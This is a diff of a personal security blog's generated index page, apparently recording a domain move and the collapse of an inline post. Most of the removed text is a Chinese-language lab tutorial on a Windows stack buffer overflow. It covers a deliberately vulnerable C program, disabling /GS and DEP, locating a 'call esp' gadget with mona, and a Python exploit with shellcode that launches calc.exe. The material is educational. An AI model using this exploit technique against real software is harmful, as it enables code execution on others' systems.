@@ -16,18 +16,18 @@
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.czxvan.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"czxvan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
     <meta property="og:type" content="website">
 <meta property="og:title" content="czxvan&#39;s blog">
-<meta property="og:url" content="http://blog.czxvan.cn/index.html">
+<meta property="og:url" content="https://czxvan.github.io/index.html">
 <meta property="og:site_name" content="czxvan&#39;s blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="czxvan">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://blog.czxvan.cn/">
+<link rel="canonical" href="https://czxvan.github.io/">
 
 
 
@@ -145,7 +145,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -182,7 +182,93 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/19/winsock-practice/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/20/Create-Shellcode-in-Windows/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="czxvan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | czxvan's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/10/20/Create-Shellcode-in-Windows/" class="post-title-link" itemprop="url">Create Shellcode in Windows</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-10-20 22:07:43 / 修改时间：22:10:19" itemprop="dateCreated datePublished" datetime="2023-10-20T22:07:43+08:00">2023-10-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Windows-PWN/" itemprop="url" rel="index"><span itemprop="name">Windows-PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/10/20/Create-Shellcode-in-Windows/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/19/winsock-practice/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -250,7 +336,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/19/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/19/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -318,7 +404,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/19/Exploitme/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/19/Exploitme/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -354,7 +440,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-10-20 21:56:54" itemprop="dateModified" datetime="2023-10-20T21:56:54+08:00">2023-10-20</time>
+      <time title="修改时间：2023-10-20 22:10:33" itemprop="dateModified" datetime="2023-10-20T22:10:33+08:00">2023-10-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -385,103 +471,14 @@
 <li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/173654.html">Windows漏洞利用开发教程Part 5：返回导向编程(ROP) - FreeBuf网络安全行业门户</a></p>
 </li>
 </ul>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li><p>visual studio : windows上还是得用这个，mingw不够友好</p>
-<ul>
-<li><p>配置：修改配置时，记得正确调整配置模式和平台，这里选用 所有配置+所有平台。</p>
-<ul>
-<li>禁用安全检查 &#x2F;GS-（配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查）</li>
-<li>关闭数据执行保护 &#x2F;NXCOMPAT:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
-</ul>
-</li>
-<li><p>技巧：</p>
-<ul>
-<li>启动调试后，（已默认开启地址级调试）可以通过 <code>调试—&gt;窗口—&gt;反汇编</code> 查看程序的反汇编，快捷键 ctrl+alt+d</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>windbg : windows上绕不过去的调试器，早上手早熟练；</p>
-<ul>
-<li><p>如果使用windows商店下载的windbg，虽然好看，但需要解决权限问题，比较麻烦（后面需要往windbg文件夹里添加文件，或者复制一份到普通目录下），<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/321693587">权限问题解决</a></p>
-</li>
-<li><p>也可以下载 WDK，使用里面带的 windbg，下载链接：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-CN/windows-hardware/drivers/other-wdk-downloads#step-2-install-the-wdk">WDK 下载 </a></p>
-</li>
-</ul>
-</li>
-<li><p>python2 ： 建议从官网下载<code>2.7.18</code>安装版，如果使用pyenv或其他python版本管理工具下载便携版，后面可能会因为缺少注册表项出问题（比如找不到python或者<code>failed to load python module</code>)</p>
-<ul>
-<li><p>下载链接：<a target="_blank" rel="noopener" href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a> 注意32位还是64位需要和使用的windbg保持一致</p>
-</li>
-<li><p>之后下安装<code>pykd</code>包，不然运行插件后会出现“Do not run this script outside of a debugger !”，命令和下面相似</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Python27\Scripts&gt; .\pip.exe install pykd</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>mona 插件</p>
-<ul>
-<li>下载链接：<a target="_blank" rel="noopener" href="https://github.com/corelan/windbglib">corelan&#x2F;windbglib</a></li>
-<li>如果上面下载的<code>pykd.pyd</code>没办法使用，可以从这里下载 <a target="_blank" rel="noopener" href="https://github.com/hac425xxx/pykd-ext/releases/tag/pykd_ext_2.0.0.24">pykd_ext</a>，将解压后得到的 pykd.dll 放到对应目录即可。</li>
-</ul>
-</li>
-</ul>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><p>一个存在漏洞的c&#x2F;c++程序：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name and press ENTER\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果运行程序后，输入的字符超过32个，比如32个“a”+4个“b“+4个”c”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>
-
-<p>会出现以下情况</p>
-<ul>
-<li><p>debug模式下，<code>运行时检查</code>会检查到输入过长破坏了<code>name</code>变量</p>
-</li>
-<li><p>release模式下</p>
-<ul>
-<li><p>运行，以非0的错误代码（如-1073741819）退出</p>
-</li>
-<li><p>调试，显示触发异常的地址为 0x63636363，符合预期</p>
-<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\Exploitme\未经处理的异常.png" alt="未经处理的异常"></p>
-</li>
-</ul>
-</li>
-</ul>
-<p>为了方便，之后我们只在<code>release</code>模式下运行即可。</p>
-<p>为了更简洁地描述，我们修改程序，让文本内容可从文件<code>name.txt</code>中被读取，编译后运行结果和上面一致</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>); # 注意要使用绝对路径，不然下面使用的windbg找不到该文件</span><br><span class="line">    <span class="keyword">if</span> (!f)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> bytes = ftell(f);</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    fread(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">    name[bytes] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>name.txt:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-windbg-进行调试"><a href="#使用-windbg-进行调试" class="headerlink" title="使用 windbg 进行调试"></a>使用 windbg 进行调试</h3><p>使用<code>windbg</code>加载上面生成的程序<code>Exploitme.exe</code>，按<code>F5</code>或输入命令<code>g</code>，得到以下报错信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(31e0.4f48): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000000 ebx=0067b000 ecx=0fce700e edx=755d0334 esi=00c868e8 edi=00c8c2a8</span><br><span class="line">eip=63636363 esp=008ff888 ebp=62626262 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246</span><br><span class="line">63636363 ??              ???</span><br></pre></td></tr></table></figure>
-
-<p>查看栈内存，我们希望cccc指向cccc之后的这块内存（当执行完main函数中的ret后，ESP寄存器的值刚好指向这里），我们会在这里填充shellcode。但由于ASLR（地址空间布局随机化，简称地址随机化），两次的ESP值不同，也就意味着我们无法将 cccc 替换为一个固定的地址。</p>
-<p>![aslr for stack](D:\Users\czx\NativeFiles\Desktop\blog\source\pic\Exploitme\aslr for stack.png)</p>
-<p>不过，可以将 cccc 替换为一个指向 jmp ESP 指令的地址（代码段的指令的地址是固定的），程序执行流就会变成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret ——》 jmp ESP --》 [shellcode]</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用mona"><a href="#使用mona" class="headerlink" title="使用mona"></a>使用mona</h3><p>为了寻找 jmp ESP 指令的地址，我们可以使用 mona 插件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .load pykd</span><br><span class="line">0:000&gt; !pykd.info</span><br><span class="line"></span><br><span class="line">pykd bootstrapper version: 2.0.0.24</span><br><span class="line"></span><br><span class="line">Installed python:</span><br><span class="line"></span><br><span class="line">Version:        Status:     Image:</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">* 2.7 x86-32    Loaded      C:\Windows\SYSTEM32\python27.dll  # 注意要选用python2，如果默认指向了python3，可使用 !pykd.select -2.7进行切换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:000&gt; !py mona jmp -r ESP -m ntdll.dll	# 尝试了 kernel32.dll 没找到符合要求得指令，在 ntdll.dll 中找到了</span><br><span class="line"></span><br><span class="line">** You are running pykd.pyd v0.3.4.15. Use at your own risk **</span><br><span class="line"></span><br><span class="line">Hold on...</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    - Search complete, processing results</span><br><span class="line">[+] Preparing output file &#x27;jmp.txt&#x27;</span><br><span class="line">    - (Re)setting logfile jmp.txt</span><br><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 1 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 4 </span><br><span class="line">[+] Results : </span><br><span class="line">0x77bece33 |   0x77bece33 (b+0x0010ce33)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afb318 |   0x77afb318 (b+0x0001b318)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afc712 |   0x77afc712 (b+0x0001c712)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd1f8 |   0x77bbd1f8 (b+0x000dd1f8)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd250 |   0x77bbd250 (b+0x000dd250)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">    Found a total of 5 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:00.759000</span><br></pre></td></tr></table></figure>
-
-<p><code>mona</code>没有找到 <code>jmp ESP</code>指令，但找到了功能基本一致的<code>call ESP</code>和<code>push esp; ret</code>指令（这两种指令执行后，ESP的值不同，不过对我们影响不大），都能够将执行流引导至<code>shellcode</code>。</p>
-<p>我们使用上面找的<code>call esp</code>指令，其地址为 0x77bece33</p>
-<h3 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h3><p>编写python脚本 <code>exp1.py</code>，修改<code>name.txt</code>中的内容</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = <span class="string">b&#x27;\xcc&#x27;</span>	<span class="comment"># 调试模式下会在此中断</span></span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>
-
-<p>回到visual studio，release模式下进行调试，main返回后，出现以下弹窗：</p>
-<p><img src="/../pic/Exploitme/0xcc.png" alt="0xcc"></p>
-<p>说明测试成功。</p>
-<p>下面将 “\xcc” 替换为真正的 <code>shellcode</code>：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>shellcode</code>由以下程序得到，转换原理见：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WinExec                0x7bb4c07f</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line">    DefineFuncPtr(WinExec);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> calc[] = &#123; <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;     <span class="comment">// makes our shellcode shorter</span></span><br><span class="line">    My_WinExec(calc, SW_SHOW);</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>之后在release模式下运行程序，成功执行<code>shellcode</code>，弹出了一个计算器：</p>
-<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\Exploitme\pwn.png" alt="pwn"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/10/19/Exploitme/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -507,7 +504,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/17/Create-a-Linux-Kernel-Module/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/17/Create-a-Linux-Kernel-Module/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -607,7 +604,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/17/Create-a-Blog-with-Hexo/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/17/Create-a-Blog-with-Hexo/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -694,7 +691,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
